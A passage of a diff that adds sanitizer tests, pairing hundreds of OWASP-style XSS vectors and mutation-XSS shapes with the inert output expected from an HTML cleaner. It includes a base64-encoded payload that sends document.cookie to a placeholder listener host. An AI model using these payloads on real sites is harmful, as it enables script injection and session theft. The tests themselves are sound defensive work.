+        Vector(text: "<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">", ugc: "<img>")
+        Vector(text: "<A HREF=\"h\ntt  p://6\t6.000146.0x7.147/\">XSS</A>", ugc: "<a>XSS</a>")
+        Vector(text: "<A HREF=\"//www.google.com/\">XSS</A>", ugc: "<a href=\"//www.google.com/\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "<A HREF=\"http://google.com/\">XSS</A>", ugc: "<a href=\"http://google.com/\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "<A HREF=\"http://www.google.com./\">XSS</A>", ugc: "<a href=\"http://www.google.com./\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>", ugc: "<a>XSS</a>")
+        Vector(text: "<A HREF=\"http://www.google.com/ogle.com/\">XSS</A>", ugc: "<a href=\"http://www.google.com/ogle.com/\" rel=\"nofollow\">XSS</a>")
+        Vector(text: "/?xss=500); alert(document.cookie);//", ugc: "/?xss=500); alert(document.cookie);//")
+        Vector(text: "...\nheader('Location: '.$_GET['param']);\n...", ugc: "...\nheader('Location: '.$_GET['param']);\n...")
+        Vector(text: "...\nheader('Refresh: 0; URL='.$_GET['param']);\n...", ugc: "...\nheader('Refresh: 0; URL='.$_GET['param']);\n...")
+    ]
+
+    for v in vectors
+        assert holds(v)
+
+test "OWASP: the cheat sheet's fenced vectors, the backslashes of its Markdown taken out, 7"
+    vectors = [
+        Vector(text: "<a onmouseover=\"alert(document.cookie)\">xxs link</a>", ugc: "<a>xxs link</a>")
+        Vector(text: "<a onmouseover=alert(document.cookie)>xxs link</a>", ugc: "<a>xxs link</a>")
+        Vector(text: "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", ugc: "<img>\"&gt;")
+        Vector(text: "<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert(\"XSS\")>", ugc: "")
+        Vector(text: "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", ugc: "&lt;")
+        Vector(text: "<script> ... setTimeout(\\\\\"writetitle()\\\\\",$_GET[xss]) ... </script>", ugc: "")
+        Vector(text: "<script> ... eval($_GET[xss]); ... </script>", ugc: "")
+    ]
+
+    for v in vectors
+        assert holds(v)
+
+test "OWASP: the strings that bypass a firewall, and the obfuscations of `alert`, 36"
+    vectors = [
+        Vector(text: "<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">", ugc: "<img src=\"x\">")
+        Vector(text: "<Video> <source onerror = \"javascript: alert (XSS)\">", ugc: " ")
+        Vector(text: "<Input value = \"XSS\" type = text>", ugc: "")
+        Vector(text: "<applet code=\"javascript:confirm(document.cookie);\">", ugc: "")
+        Vector(text: "<isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">", ugc: "")
+        Vector(text: "\"></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", ugc: "\"&gt;\"&gt;'&gt;")
+        Vector(text: "\"><img src=\"x:x\" onerror=\"alert(XSS)\">", ugc: "\"&gt;<img>")
+        Vector(text: "\"><iframe src=\"javascript:alert(XSS)\">", ugc: "\"&gt;")
+        Vector(text: "<object data=\"javascript:alert(XSS)\">", ugc: "")
+        Vector(text: "<isindex type=image src=1 onerror=alert(XSS)>", ugc: "")
+        Vector(text: "<img src=x:alert(alt) onerror=eval(src) alt=0>", ugc: "<img alt=\"0\">")
+        Vector(text: "<img  src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img>", ugc: "<img>")
+        Vector(text: "<iframe/src=\"data:text/html,<svg onload=alert(1)>\">", ugc: "")
+        Vector(text: "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>", ugc: "")
+        Vector(text: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">", ugc: "")
+        Vector(text: "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>", ugc: "")
+        Vector(text: "<form><a href=\"javascript:\\u0061lert(1)\">X", ugc: "<a>X</a>")
+        Vector(text: "</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>", ugc: "<img>")
+        Vector(text: "<style>//*{x:expression(alert(/xss/))}//<style></style>", ugc: "")
+        Vector(text: "<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">", ugc: "<img src=\"/\">")
+        Vector(text: "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe", ugc: "<a>ClickMe</a>")
+        Vector(text: "<form><button formaction=javascript&colon;alert(1)>CLICKME", ugc: "CLICKME")
+        Vector(text: "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"", ugc: "")
+        Vector(text: "<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>", ugc: "")
+        Vector(text: "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT> ", ugc: " ")
+        Vector(text: "(alert)(1)", ugc: "(alert)(1)")
+        Vector(text: "a=alert,a(1)", ugc: "a=alert,a(1)")
+        Vector(text: "[1].find(alert)", ugc: "[1].find(alert)")
+        Vector(text: "top[\"al\"+\"ert\"](1)", ugc: "top[\"al\"+\"ert\"](1)")
+        Vector(text: "top[/al/.source+/ert/.source](1)", ugc: "top[/al/.source+/ert/.source](1)")
+        Vector(text: "al\\u0065rt(1)", ugc: "al\\u0065rt(1)")
+        Vector(text: "top['al\\145rt'](1)", ugc: "top['al\\145rt'](1)")
+        Vector(text: "top['al\\x65rt'](1)", ugc: "top['al\\x65rt'](1)")
+        Vector(text: "top[8680439..toString(30)](1)", ugc: "top[8680439..toString(30)](1)")
+        Vector(text: "alert?.()", ugc: "alert?.()")
+        Vector(text: "(alert())", ugc: "(alert())")
+    ]
+
+    for v in vectors
+        assert holds(v)
+
+test "OWASP: every event handler of the cheat sheet's list, on a paragraph, 102"
+    vectors = [
+        Vector(text: "<p onAbort=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onActivate=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onAfterPrint=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onAfterUpdate=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforeActivate=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforeCopy=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforeCut=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforeDeactivate=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforeEditFocus=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforePaste=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforePrint=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforeUnload=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBeforeUpdate=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBegin=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBlur=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onBounce=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onCellChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onClick=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onContextMenu=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onControlSelect=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onCopy=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onCut=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDataAvailable=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDataSetChanged=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDataSetComplete=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDblClick=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDeactivate=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDrag=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDragEnd=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDragLeave=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDragEnter=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDragOver=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDragDrop=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDragStart=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onDrop=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onEnd=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onError=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onErrorUpdate=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onFilterChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onFinish=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onFocus=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onFocusIn=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onFocusOut=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onHashChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onHelp=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onInput=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onKeyDown=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onKeyPress=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onKeyUp=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onLayoutComplete=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onLoad=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onLoseCapture=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMediaComplete=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMediaError=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMessage=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseDown=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseEnter=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseLeave=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseMove=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseOut=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseOver=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseUp=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMouseWheel=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMove=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMoveEnd=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onMoveStart=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onOffline=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onOnline=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onOutOfSync=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onPaste=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onPause=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onPopState=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onPropertyChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onReadyStateChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onRedo=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onRepeat=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onReset=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onResize=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onResizeEnd=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onResizeStart=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onResume=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onReverse=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onRowsEnter=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onRowExit=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onRowDelete=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onRowInserted=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onScroll=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onSeek=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onSelect=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onSelectionChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onSelectStart=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onStart=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onStop=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onStorage=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onSyncRestored=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onSubmit=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onTimeError=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onTrackChange=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onUndo=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onUnload=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+        Vector(text: "<p onURLFlip=\"alert('XSS')\">x</p>", ugc: "<p>x</p>")
+    ]
+
+    for v in vectors
+        assert holds(v)
+
+test "OWASP: every way the cheat sheet writes `<`, around a script, 70"
+    vectors = [
+        Vector(text: "<script>alert('XSS')</script>", ugc: "")
+        Vector(text: "%3Cscript>alert('XSS')%3C/script>", ugc: "%3Cscript&gt;alert('XSS')%3C/script&gt;")
+        Vector(text: "&ltscript>alert('XSS')&lt/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&lt;script>alert('XSS')&lt;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&LTscript>alert('XSS')&LT/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&LT;script>alert('XSS')&LT;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#60script>alert('XSS')&#60/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#060script>alert('XSS')&#060/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#0060script>alert('XSS')&#0060/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#00060script>alert('XSS')&#00060/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#000060script>alert('XSS')&#000060/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#0000060script>alert('XSS')&#0000060/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#60;script>alert('XSS')&#60;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#060;script>alert('XSS')&#060;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#0060;script>alert('XSS')&#0060;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#00060;script>alert('XSS')&#00060;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#000060;script>alert('XSS')&#000060;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#0000060;script>alert('XSS')&#0000060;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x3cscript>alert('XSS')&#x3c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x03cscript>alert('XSS')&#x03c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x003cscript>alert('XSS')&#x003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x0003cscript>alert('XSS')&#x0003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x00003cscript>alert('XSS')&#x00003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x000003cscript>alert('XSS')&#x000003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x3c;script>alert('XSS')&#x3c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x03c;script>alert('XSS')&#x03c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x003c;script>alert('XSS')&#x003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x0003c;script>alert('XSS')&#x0003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x00003c;script>alert('XSS')&#x00003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x000003c;script>alert('XSS')&#x000003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X3cscript>alert('XSS')&#X3c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X03cscript>alert('XSS')&#X03c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X003cscript>alert('XSS')&#X003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X0003cscript>alert('XSS')&#X0003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X00003cscript>alert('XSS')&#X00003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X000003cscript>alert('XSS')&#X000003c/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X3c;script>alert('XSS')&#X3c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X03c;script>alert('XSS')&#X03c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X003c;script>alert('XSS')&#X003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X0003c;script>alert('XSS')&#X0003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X00003c;script>alert('XSS')&#X00003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X000003c;script>alert('XSS')&#X000003c;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x3Cscript>alert('XSS')&#x3C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x03Cscript>alert('XSS')&#x03C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x003Cscript>alert('XSS')&#x003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x0003Cscript>alert('XSS')&#x0003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x00003Cscript>alert('XSS')&#x00003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x000003Cscript>alert('XSS')&#x000003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x3C;script>alert('XSS')&#x3C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x03C;script>alert('XSS')&#x03C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x003C;script>alert('XSS')&#x003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x0003C;script>alert('XSS')&#x0003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x00003C;script>alert('XSS')&#x00003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#x000003C;script>alert('XSS')&#x000003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X3Cscript>alert('XSS')&#X3C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X03Cscript>alert('XSS')&#X03C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X003Cscript>alert('XSS')&#X003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X0003Cscript>alert('XSS')&#X0003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X00003Cscript>alert('XSS')&#X00003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X000003Cscript>alert('XSS')&#X000003C/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X3C;script>alert('XSS')&#X3C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X03C;script>alert('XSS')&#X03C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X003C;script>alert('XSS')&#X003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X0003C;script>alert('XSS')&#X0003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X00003C;script>alert('XSS')&#X00003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "&#X000003C;script>alert('XSS')&#X000003C;/script>", ugc: "&lt;script&gt;alert('XSS')&lt;/script&gt;")
+        Vector(text: "\\x3cscript>alert('XSS')\\x3c/script>", ugc: "\\x3cscript&gt;alert('XSS')\\x3c/script&gt;")
+        Vector(text: "\\x3Cscript>alert('XSS')\\x3C/script>", ugc: "\\x3Cscript&gt;alert('XSS')\\x3C/script&gt;")
+        Vector(text: "\\u003cscript>alert('XSS')\\u003c/script>", ugc: "\\u003cscript&gt;alert('XSS')\\u003c/script&gt;")
+        Vector(text: "\\u003Cscript>alert('XSS')\\u003C/script>", ugc: "\\u003Cscript&gt;alert('XSS')\\u003C/script&gt;")
+    ]
+
+    for v in vectors
+        assert holds(v)
+
+# Mutation XSS: the shapes that change meaning once written and read again,
+# namespace confusion between HTML, SVG and MathML and the elements whose text
+# is read as it is, gathered for this package and not from the cheat sheet.
+test "mutation XSS: 47 shapes of namespace confusion and raw text, each settled and inert"
+    shapes = [
+        "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">"
+        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"
+        "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>"
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+        "<svg><style><img src=x onerror=alert(1)></style></svg>"
+        "<math><style><img src=x onerror=alert(1)></style></math>"
+        "<template><style></template><img src=x onerror=alert(1)></style>"
+        "<textarea></textarea><img src=x onerror=alert(1)>"
+        "<!--><img src=x onerror=alert(1)>-->"
+        "<a title=\"--><img src=x onerror=alert(1)>\">x</a>"
+        "<xmp><img src=x onerror=alert(1)></xmp>"
+        "<svg><![CDATA[><img src=x onerror=alert(1)>]]></svg>"
+        "<table><a href=\"javascript:x\">t</a></table>"
+        "<select><style><img src=x onerror=alert(1)></style></select>"
+        "<math><annotation-xml encoding=\"text/html\"><style><img src=x onerror=alert(1)>"
+        "<svg><foreignObject><p><style><img src=x onerror=alert(1)>"
+        "<svg><desc><svg><style><img src=x onerror=alert(1)>"
+        "<math><mi><svg><style>&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;</style></svg></mi></math>"
+        "<svg><title><style><img src=x onerror=alert(1)>"
+        "<noembed><img title=\"</noembed><img src=x onerror=alert(1)>\"></noembed>"
+        "<noframes><img title=\"</noframes><img src=x onerror=alert(1)>\"></noframes>"
+        "<plaintext><img src=x onerror=alert(1)>"
+        "<listing>&lt;img src=x onerror=alert(1)&gt;</listing>"
+        "<title><img src=x onerror=alert(1)></title>"
+        "<svg><a href=\"javascript:alert(1)\"><text>x</text></a></svg>"
+        "<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>"
+        "<math href=\"javascript:alert(1)\"><mi>x</mi></math>"
+        "<svg><animate attributeName=\"href\" values=\"javascript:alert(1)\"/><a><text>x</text></a></svg>"
+        "<svg><set attributeName=\"onmouseover\" to=\"alert(1)\"/></svg>"
+        "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/></svg>"
+        "<form><button formaction=\"javascript:alert(1)\">x</button></form>"
+        "<img src=x srcset=\"javascript:alert(1) 1x\">"
+        "<!--[if IE]><script>alert(1)</script><![endif]-->"
+        "<!-- a --!><img src=x onerror=alert(1)>-->"
+        "<?xml version=\"1.0\"?><img src=x onerror=alert(1)>"
+        "<?x a><img src=x onerror=alert(1)>?>"
+        "<div id=\"x\"></div><style>@import 'javascript:alert(1)';</style>"
+        "<img src=\"java&#x0D;script:alert(1)\">"
+        "<svg><foreignObject><math><mi><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">"
+        "<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title=\"</style><img src onerror=alert(1)>\"></style></h1>"
+        "<svg><p><style><img src=x onerror=alert(1)></style></p></svg>"
+        "<table><tbody><tr><td><svg><style><img src=x onerror=alert(1)>"
+        "<a href=\"\u{1}javascript:alert(1)\">x</a>"
+        "<a href=\"javascript&colon;alert(1)\">x</a>"
+        "<a href=\"&#x6A;avascript:alert(1)\">x</a>"
+        "<a href=\"JaVaScRiPt:alert(1)\">x</a>"
+        "<a href=\"  javascript:alert(1)\">x</a>"
+    ]
+
+    for s in shapes
+        assert settles(s)
+
+test "scheme_seen: a scheme behind controls, tabs in it, a relative path and a digit first"
+    assert scheme_seen(" \u{1}JaVa\tscript:x") == "javascript" && scheme_seen("/a:b") == "" && scheme_seen("1a:b") == "" && scheme_seen(":x") == ""
